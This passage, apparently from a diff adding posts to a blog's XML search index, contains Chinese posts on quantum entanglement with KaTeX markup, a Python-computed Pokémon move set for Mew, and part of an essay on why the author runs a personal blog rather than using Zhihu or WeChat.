class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4500049999999998em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>
+<p>假如某个时候测量第一个电子，测得自旋向上，即 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mn>0</mn><mo stretchy="false">⟩</mo></mrow><annotation encoding="application/x-tex">|0\rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">0</span><span class="mclose">⟩</span></span></span></span>，则两个电子的整个状态表示为：</p>
+<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi>ψ</mi><mo stretchy="false">⟩</mo><mo>=</mo><mi mathvariant="normal">∣</mi><mn>0</mn><msub><mo stretchy="false">⟩</mo><mn>1</mn></msub><mo>⨂</mo><mo stretchy="false">(</mo><msub><mi>α</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mn>0</mn><msub><mo stretchy="false">⟩</mo><mn>2</mn></msub><mo>+</mo><msub><mi>β</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mn>1</mn><msub><mo stretchy="false">⟩</mo><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">|\psi\rangle = |0\rangle_1 \bigotimes (\alpha_2|0\rangle_2 + \beta_2|1\rangle_2)
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.03588em;">ψ</span><span class="mclose">⟩</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mord">∣</span><span class="mord">0</span><span class="mclose"><span class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">⨂</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">0</span><span class="mclose"><span class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">1</span><span class="mclose"><span class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p>
+<p>可见测得第一个电子的自旋状态后，第二个电子的状态仍处于量子叠加态。即<strong>假如两个电子没有纠缠，则测量其中一个电子的状态并不会改变另一个电子的状态。</strong></p>
+<p>回到例一，如果纠缠没有形成，即小明和小红不是夫妻关系，则事件 A 和事件 B 就是两个独立发生的事件了。例二同理，只有甲和乙是在下同一盘棋，AB 两事件才会纠缠。</p>
+<h3 id="假如两个电子纠缠"><a class="markdownIt-Anchor" href="#假如两个电子纠缠"></a> 假如两个电子纠缠</h3>
+<p>假设有两个纠缠的电子，这里选择将两个电子的自旋状态表示为：</p>
+<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi>ψ</mi><mo stretchy="false">⟩</mo><mo>=</mo><mi>α</mi><mi mathvariant="normal">∣</mi><mn>0</mn><msub><mo stretchy="false">⟩</mo><mn>1</mn></msub><mi mathvariant="normal">∣</mi><mn>1</mn><msub><mo stretchy="false">⟩</mo><mn>2</mn></msub><mo>+</mo><mi>β</mi><mi mathvariant="normal">∣</mi><mn>1</mn><msub><mo stretchy="false">⟩</mo><mn>1</mn></msub><mi mathvariant="normal">∣</mi><mn>0</mn><msub><mo stretchy="false">⟩</mo><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">|\psi\rangle = \alpha|0\rangle_1|1\rangle_2 + \beta|1\rangle_1|0\rangle_2
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.03588em;">ψ</span><span class="mclose">⟩</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord">∣</span><span class="mord">0</span><span class="mclose"><span class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">1</span><span class="mclose"><span class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mord">∣</span><span class="mord">1</span><span class="mclose"><span class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">0</span><span class="mclose"><span class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
+<p>此时两个电子的综合状态可能有两种情况：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mn>0</mn><msub><mo stretchy="false">⟩</mo><mn>1</mn></msub><mi mathvariant="normal">∣</mi><mn>1</mn><msub><mo stretchy="false">⟩</mo><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">|0\rangle_1|1\rangle_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">0</span><span class="mclose"><span class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">1</span><span class="mclose"><span class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 或 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mn>1</mn><msub><mo stretchy="false">⟩</mo><mn>1</mn></msub><mi mathvariant="normal">∣</mi><mn>0</mn><msub><mo stretchy="false">⟩</mo><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">|1\rangle_1|0\rangle_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">1</span><span class="mclose"><span class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">0</span><span class="mclose"><span class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。前者表示第一个电子自旋向上第二个自旋向下，后者表示第一个电子自旋向下第二个自旋向上。</p>
+<p>两种情况的第一个电子与第二个电子的自旋方向都相反。就像例二中两种结果下两个事件的真假性都相反一样。</p>
+<p>假如某个时刻测量第一个电子，<strong>两个电子的综合状态会塌陷到上述两个状态的其中一个</strong>。假如得到自旋向上，那么综合状态将会是：</p>
+<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi>ψ</mi><mo stretchy="false">⟩</mo><mo>=</mo><mi mathvariant="normal">∣</mi><mn>0</mn><msub><mo stretchy="false">⟩</mo><mn>1</mn></msub><mi mathvariant="normal">∣</mi><mn>1</mn><msub><mo stretchy="false">⟩</mo><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">|\psi\rangle = |0\rangle_1|1\rangle_2
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.03588em;">ψ</span><span class="mclose">⟩</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">0</span><span class="mclose"><span class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">1</span><span class="mclose"><span class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
+<p>可见第二个电子的自旋状态必定为自旋向下。即<strong>两个纠缠的电子，不管相隔多远，都可以由测量得到的一个电子的状态判断得到另一个电子的状态。</strong></p>
+]]></content>
+      <categories>
+        <category>其他</category>
+      </categories>
+      <tags>
+        <tag>量子计算</tag>
+        <tag>量子纠缠</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用 Python 为梦幻计算最优配招</title>
+    <url>/archives/2/</url>
+    <content><![CDATA[<p>梦幻是精灵宝可梦系列游戏的第一只<a href="https://wiki.52poke.com/wiki/%E5%B9%BB%E4%B9%8B%E5%AE%9D%E5%8F%AF%E6%A2%A6">幻之宝可梦</a>，拥有所有宝可梦的基因，没有性别，几乎所有宝可梦的招式 ta 都能学会，因此很多人认为 ta 就是宝可梦的始祖。</p>
+<p>梦幻独一无二的奇葩种族值：</p>
+<img src="/archives/2/mewnum.png" class="" title="梦幻种族值">
+<p>然而在我为梦幻配招的时候却犯了难：梦幻能学习所有技能学习器的技能，那应该怎么为梦幻配招呢？一个有趣的想法是<strong>让梦幻的四个招式能够尽可能地克制对方宝可梦的属性</strong>。于是我写了一个简单的 Python 脚本来帮我计算哪四个技能的组合能克制最多的属性。</p>
+<a id="more"></a>
+<p>运行脚本得到的最优解有 3 种，能克制 14 个属性（不计组合属性，一共 18 个属性）：</p>
+<ol>
+<li><strong>地冰斗幽</strong>：毒岩钢火电飞地草龙般冰恶幽超</li>
+<li><strong>地飞冰斗</strong>：毒岩钢火电斗虫草飞地龙般冰恶</li>
+<li><strong>恶地冰斗</strong>：幽超毒岩钢火电飞地草龙般冰恶</li>
+</ol>
+<p>但是考虑到梦幻能够学习威力不俗的虫属性<strong>吸取</strong>招式<a href="https://wiki.52poke.com/wiki/%E5%90%B8%E8%A1%80%EF%BC%88%E6%8B%9B%E5%BC%8F%EF%BC%89">吸血</a>，我比较倾向于选择有虫属性的解，所以筛选出含有虫属性招式的解，得到了如下的结果，能克制 13 个属性：</p>
+<ol>
+<li><strong>火冰虫地</strong>：虫钢草冰飞地龙超恶毒岩火电</li>
+<li><strong>草虫地岩</strong>：地岩水草超恶毒钢火电飞虫冰</li>
+<li><strong>冰虫地岩</strong>：飞地草龙超恶毒岩钢火电虫冰</li>
+<li><strong>冰钢地虫</strong>：飞地草龙岩冰妖毒钢火电超恶</li>
+<li><strong>冰飞地虫</strong>：飞地草龙斗虫毒岩钢火电超恶</li>
+<li><strong>斗冰虫地</strong>：般岩钢冰恶飞地草龙超毒火电</li>
+<li><strong>妖虫地岩</strong>：斗龙恶草超毒岩钢火电飞虫冰</li>
+</ol>
+<p>再三权衡下选择了<strong>虫地草岩</strong>的搭配：</p>
+<ul>
+<li>虫：吸血</li>
+<li>地：十万马力</li>
+<li>草：强力鞭打</li>
+<li>岩：尖石攻击</li>
+</ul>
+]]></content>
+      <categories>
+        <category>游戏</category>
+      </categories>
+      <tags>
+        <tag>精灵宝可梦</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>为什么我要搭建个人博客</title>
+    <url>/archives/1/</url>
+    <content><![CDATA[<img src="/archives/1/1_1.jpg" class="" title="博客">
+<p>2020年的今天，我们已经有了知乎、微信公众号等很好的传媒平台，但是我还是决定开历史的倒车，搭建了我的个人博客。为什么我不选择容易维护和运营的成熟平台，而是选择了十年前就开始走向小众的个人博客呢？我想从万维网的发展史开始讲起。</p>
+<a id="more"></a>
+<h2 id="万维网的诞生"><a class="markdownIt-Anchor" href="#万维网的诞生"></a> 万维网的诞生</h2>
+<div class="note info"><h3 id="万维网"><a class="markdownIt-Anchor" href="#万维网"></a> 万维网</h3>
+<p>万维网（World Wide Web）亦作 <strong>WWW</strong> 或 Web，是一个透过互联网访问的，由许多互相链接的超文本组成的系统。</p>
+<p>万维网并不等同互联网，万维网只是互联网所能提供的服务其中之一，是靠着互联网运行的一项服务。</p>
+<p>来源：<a href="https://zh.wikipedia.org/wiki/%E4%B8%87%E7%BB%B4%E7%BD%91">维基百科-万维网</a></p>
+</div>
+<p>说到万维网的诞生，就不得不说道一个人：Tim Berners-Lee。他是万维网之父，同时也是全世界第一个网页浏览器的发明者，以及 2016 年图灵奖的获得者。Tim Berners-Lee 于 1989 年在欧洲原子研究组织（CERN）发明了万维网，但是他并没有为这项技术申请专利。1993 年 4 月 30 日，欧洲核子研究组织宣布万维网对任何人免费开放。同年，世界上第一个图形界面浏览器 Mosiac（网景浏览器 Netscape 的前身）发布。等等一系列原因使得万维网成为当时最受欢迎的互联网协议。</p>
+<img src="/archives/1/1_2.jpg" class="" title="Tim Berners-Lee">
+<p>1994年 Tim Berners-Lee 来到麻省理工，领导创建了万维网联盟（W3C）。由于万维网协议（如 HTML）由不同的供应商提供，导致不同版本协议的兼容性很容易出问题。W3C 就是一个试图建立一套统一的万维网核心原则、协议和组件的半自治非政府组织。</p>
+<p>在 Tim Berners-Lee 最早的构想中，万维网并不仅仅是一个文本文档的互联网络，也是一个知识的互联网络，这也是现在人工智能的方向之一——知识图谱的原型。Tim Berners-Lee 将万维网构想成一个全人类共建共享的知识库，一个全人类共同拥有的知识财富。这也是 Tim Berners-Lee 不为万维网申请专利的原因之一，同时促进了互联网精神的产生与发展。</p>
+<div class="note info"><h3 id="互联网精神"><a class="markdownIt-Anchor" href="#互联网精神"></a> 互联网精神</h3>
+<p>互联网精神即：开放、平等、协作、快速、分享（非共享）</p>
+<p>来源：<a href="https://baike.baidu.com/item/%E4%BA%92%E8%81%94%E7%BD%91%E7%B2%BE%E7%A5%9E/9867749?fr=aladdin">百度百科-互联网精神</a></p>
+</div>
+<p>值得一提的是，“互联网精神”的概念其实是国内早期的互联网人提出来的，并且国外并没有一个相同含义的专业名词与之对应。不过如果你想体会真正的互联网精神，国外的各种开源社区应该是最好的去处。</p>
+<p>小米公司早期的成功离不开小米社区。2010 年，各种质量参差不齐的安卓 ROM 包满天飞的时候，突然出现了一个质量很高的国产 ROM，并且有自己的社区，每一个用户的疑问都能在社区得到来自开发者的快速回应。MIUI 最早的 100 个内测用户就是在小米社区上征集的。可以说，小米和当时国内其他的手机厂商都不一样，因为小米一出生就带有互联网的基因。</p>
+<p>我喜欢万维网，我喜欢使用网页，而不喜欢各种 App。大概从 2010 年开始，移动互联网兴起，整个互联网行业开始重新洗牌，百度贴吧开始走向衰落，一步步分裂成几十个垂直型的社区孤岛。从某个角度上来说，这是行业发展趋势，没有人能够阻挡。但是我时常在遐想，Web 技术发展到今天，很多 App 其实是没必要存在的，Web 天然具有跨平台的特性，也能对移动设备有很好的兼容性，假如互联网世界能重新拥抱 Web，那能有多好。可惜因为一些众所周知的原因，这样的遐想终究只能是遐想。</p>
+<p>这是一个对百度贴吧的回忆向测评视频，从 6 分 25 秒开始的内容，确实让我感慨良多：</p>
+<div><iframe style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;" src="https://player.bilibili.com/player.html?cid=262094104&aid=415419941&page=1&as_wide=1&high_quality=1&danmaku=1" scrolling="no" frameborder="no" framespacing="0" allowfullscreen="true"></iframe></div>
+<h2 id="为什么不是知乎"><a class="markdownIt-Anchor" href="#为什么不是知乎"></a> 为什么不是知乎</h2>
+<p>知乎是一个模仿 Quora 问答型社区（起码之前是）。知乎可以说是目前国内最崇尚理性思维的大型社区，也是最重视用户知识产权的社区之一。那我为什么建立个人博客而不是直接在知乎上写东西呢？</p>
+<h3 id="社区通病点赞和热评"><a class="markdownIt-Anchor" href="#社区通病点赞和热评"></a> 社区通病：点赞和热评</h3>
+<p>这当然包括一些我所认为的很多社区的通病，比如点赞和热评。点赞和热评几乎是现在社区的标配了。</p>
+<p>我很不喜欢在一个有点赞功能的平台写东西。作为一个普通人，我写东西其实更多的是给自己看的，写作的过程就是一种与自己对话的过程。但是，对于我个人而言，当我的某篇文章有可能被别人点赞时，对这篇文章进行评价的主体就由我自己转变成为了看到这篇文章的人。因为点赞的人多而开心或者因为没有人点赞而伤心，每个人或多或少都会有类似的感觉吧。而我不喜欢这样的感觉。所以点赞的这个功能，对我个人是极其不友好的。</p>
+<p>我也很讨厌热评功能。虽然从某个角度上说，有价值的东西被摆到了更显眼的位置是一种进步，但是同时也对想发言的后来者不太友好，甚至在 B 站出现了广泛的抢首评、抢热评的现象。不过最近国内外的不少社区已经开始尝试同时将热评和最新的评论都放到比较显眼的位置，或者是让读者选择看“热评”还是“最新”，网易云音乐是我所知道的国内比较早关注这一点的大型社区，这应该是近几年网易云音乐做的最正确的一件事。</p>
+<h3 id="隐私与知识产权"><a class="markdownIt-Anchor" href="#隐私与知识产权"></a> 隐私与知识产权</h3>
+<p>隐私几乎是国内所有公司的通病，而且目前来看，无解。</p>
+<p>知乎可以说是目前国内最重视用户知识产权的社区之一，但要说瑕疵也还是有的：</p>
+<div class="note primary"><h4 id="知乎用户协议-知识产权-第四条"><a class="markdownIt-Anchor" href="#知乎用户协议-知识产权-第四条"></a> 知乎用户协议-知识产权-第四条</h4>
+<p>为了促进知识的分享和传播，用户将其在知乎上发表的全部内容，授予知乎免费的、不可撤销的、非独家使用许可，知乎有权将该内容用于知乎各种形态的产品和服务上，包括但不限于网站以及发表的应用或其他互联网产品。</p>
+<p>来源：<a href="https://www.zhihu.com/terms#sec-licence">知乎用户协议-知识产权</a></p>
+</div>
+<p>也就是说知乎有权将用户在知乎上发表的全部内容无偿用于知乎的所有产品上。</p>
+<p>目前来看也就是知乎会把内容搬到知乎日报等知乎相关的产品上。其实也无可厚非，就是感觉怪怪的，这样的说法应该有不少自由发挥的空间吧。以后发展成什么样子就不好说了。</p>
+<h3 id="更重要的原因"><a class="markdownIt-Anchor" href="#更重要的原因"></a> 更重要的原因</h3>
+<p>在 2021 年之前，我对知乎最讨厌的地方在于：知乎对移动 Web 端的访问极其不友好。但是知乎虽然不像淘宝完全屏蔽了搜索引擎，但是也做出了很多限制：</p>
+<img src="/archives/1/1_3.jpg" class="" title="在APP内查看">
+<p>现在已经是移动互联网的天下，知乎为了引流的需要而半强制性地让用户安装知乎的 App 其实也无可后非。但我觉得这样的做法并不符合<strong>开放</strong>的互联网精神。</p>
+<div class="note default"><h4 id="请求桌面站点"><a class="markdownIt-Anchor" href="#请求桌面站点"></a> 请求桌面站点</h4>
+<p>通过 iPhone 自带的 Safari 浏览器的<strong>请求桌面站点</strong>功能可以在浏览器内显示桌面网页。虽然体验不佳但是起码可以正常使用。</p>
+<img src="/archives/1/1_4.jpg" class="" title="请求桌面站点功能">
+<p>我试过的其他浏览器的类似功能都不能实现这样的效果。</p>
+</div>
+<h3 id="对知乎的彻底绝望"><a class="markdownIt-Anchor" href="#对知乎的彻底绝望"></a> 对知乎的彻底绝望</h3>
+<p>就在 2020 年年底，知乎做出了在我看来最错误的一个决定：产品逻辑由订阅转向推荐。或许这是知乎发展的需要，但是，2021 年之后的知乎，因为这个原因，我彻底放弃了在移动端使用知乎。</p>
+<p>“由订阅转向推荐有什么问题？”推荐算法以及被滥用了，我对此深恶痛绝，并视其为“洪水猛兽”。关于这一点我在本文末尾会有更多叙述。</p>
+<h2 id="为什么不是微信公众号"><a class="markdownIt-Anchor" href="#为什么不是微信公众号"></a> 为什么不是微信公众号</h2>
+<p>毫无疑问的一点是，公众号和小程序是腾讯垄断的产物。阿里和腾讯纷纷竖起高高的墙，将各种爬虫和搜索引擎挡在了淘宝网和公众号的外面。这样的好处是显而易见的，而坏处就是像我这样的人几乎从没读过公众号的文章。所以我自然也不会考虑把我的博文发在公众号上。</p>
+<p>不过有一说一，如果要进行内容运营的话，知乎和公众号倒是非常好的去处。</p>
+<p>关于腾讯垄断行为的更多内容，可以参考参考这篇新闻：</p>
+<div><iframe style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;" src="https://player.bilibili.com/player.html?cid=210965052&aid=541360648&page=1&as_wide=1&high_quality=1&danmaku=1" scrolling="no" frameborder="no" framespacing="0" allowfullscreen="true"></iframe></div>
+<h2 id="数据孤岛爆发长尾效应失效"><a class="markdownIt-Anchor" href="#数据孤岛爆发长尾效应失效"></a> 数据孤岛爆发，长尾效应失效</h2>
+<p>2019 年 1 月 19 日，Tim Berners-Lee 出席了 2019 年 EmTech China 全球新兴科技峰会并发表了演讲。他指出，互联网已经丧失了最初的精神，数据孤岛爆发，长尾效应失效。现在很多大型社交网站决定了用户看到什么、甚至决定了他们怎么思考、怎么行动，甚至怎么投出自己的选票。</p>
+<p>说简单点就是，互联网的垄断趋势已经越来越明显了。</p>
+<p>以前的互联网企业并不是没有垄断过，不过之前更多的是技术和产品的垄断，比如 2000 年险些被拆分的微软。但是这一次全球垄断的趋势，是对流量入口的垄断，更是对互联网内容的垄断。而这一类型的垄断，势必会比之前的垄断有更广且更为深远的影响。</p>
+<h3 id="数据孤岛"><a class="markdownIt-Anchor" href="#数据孤岛"></a> 数据孤岛</h3>
+<p>其实，我们每天都面临着很多数据孤岛。尽管每个人每天都在互联网上产生着大量的数据，但这些我们产生的数据却并不属于我们，这些数据被掌握在 Google、Facebook、腾讯、百度这些大公司手里，以至于这些数据之间无法形成关联，形成了一座座数据孤岛。</p>
+<p>2017年低，腾讯禁止了包括网易云音乐在内的一些音乐平台分享内容到 QQ 空间和微信朋友圈，就是数据孤岛一个很极端的例子。</p>
+<h3 id="长尾效应"><a class="markdownIt-Anchor" href="#长尾效应"></a> 长尾效应</h3>
+<p>长尾效应在本文的含义是：在一个市场中，少部分大企业占据着很大的市场，其他的一些中小企业占据着各个细分市场，而这些小的细分市场的总和仍是一个很大的市场，甚至超过了大企业占据的市场。</p>
+<p>长尾效应可以用一张图片形象地说明：</p>
+<img src="/archives/1/1_5.gif" class="" title="长尾效应">
+<p>从上图可以很直观地看出，少数几个大企业占据着前面红色部分的市场，很多中小企业分食后面蓝色部分的细分市场。理论上曲线可以无限靠近 X 轴，细分市场的总和也是一个很大的市场。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://baike.baidu.com/item/%E9%95%BF%E5%B0%BE%E6%95%88%E5%BA%94">百度百科-长尾效应</a></li>
+<li><a href="https://wiki.mbalib.com/wiki/%E9%95%BF%E5%B0%BE%E7%90%86%E8%AE%BA">MBA智库-长尾理论</a></li>
+</ul>
+<p>在其他传统行业，垄断现象会比较严重，垄断企业会不断吞并中小企业，使得细分市场的份额逐渐减少，中小企业生存艰难。</p>
+<p>而曾经的互联网行业是一个长尾效应非常明显的行业，细分市场非常繁荣。Tim Berners-Lee 认为，像 Google 这样的大型公司的出现，加剧了互联网行业长尾效应的失效以及互联网行业内互联网精神的沦丧（比如脸疼的 “Not do evil” 的 Google）。</p>
+<h3 id="拒绝投喂主动筛选"><a class="markdownIt-Anchor" href="#拒绝投喂主动筛选"></a> 拒绝投喂，主动筛选</h3>
